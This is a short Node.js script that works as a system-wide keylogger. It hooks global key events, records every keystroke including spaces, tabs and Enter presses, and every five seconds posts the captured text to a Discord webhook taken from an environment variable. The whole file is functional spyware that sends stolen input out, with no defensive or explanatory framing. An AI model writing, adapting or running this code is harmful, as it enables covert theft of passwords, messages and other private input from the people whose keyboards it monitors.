require('dotenv').config(); // For loading environment variables
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const axios = require('axios');

const KEYSTROKES_RESET_INTERVAL = 30; // in seconds
const THROTTLE_INTERVAL = 5000; // Throttle interval for sending keystrokes (in milliseconds)
const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

const keyboardListener = new GlobalKeyboardListener();
let keystrokesBuffer = '';

// Listen for key presses
keyboardListener.addListener(async function (event, keyState) {
    if (event.state === "UP") {
        switch (event.name) {
            case 'SPACE':
                process.stdout.write(' ');
                keystrokesBuffer += ' ';
                break;
            case 'TAB':
                process.stdout.write('<TAB>');
                keystrokesBuffer += '<TAB>';
                break;
            case 'RETURN':
                process.stdout.write('<ENTER>');
                keystrokesBuffer += '<ENTER>';
                break;
            default:
                process.stdout.write(event.name);
                keystrokesBuffer += event.name;
        }
    }
});

// Call a listener only once
const calledOnce = function (event) {
    console.log("This listener was only called once.");
    keyboardListener.removeListener(calledOnce);
};
keyboardListener.addListener(calledOnce);

// Send keystrokes to Discord webhook periodically with throttling
const sendKeystrokes = async () => {
    if (keystrokesBuffer) {
        try {
            await axios.post(WEBHOOK_URL, {
                "content": keystrokesBuffer,
            });
            console.log('Keystrokes sent successfully.');
            keystrokesBuffer = '';
        } catch (error) {
            console.error('Error sending keystrokes to Discord webhook:', error.message);
            // Retry mechanism can be added here
        }
    }
};

// Throttle the sending of keystrokes
const throttleAndSendKeystrokes = async () => {
    await sendKeystrokes();
    setTimeout(throttleAndSendKeystrokes, THROTTLE_INTERVAL);
};

// Start sending keystrokes
throttleAndSendKeystrokes();

// Handle graceful shutdown
process.on('SIGINT', async () => {
    console.log('Shutting down gracefully...');
    // Stop the listener
    keyboardListener.stop();
    // Send any remaining keystrokes before exiting
    await sendKeystrokes();
    process.exit(0);
});

// Reset keystrokes buffer periodically
setInterval(() => {
    keystrokesBuffer = '';
}, 1000 * KEYSTROKES_RESET_INTERVAL);
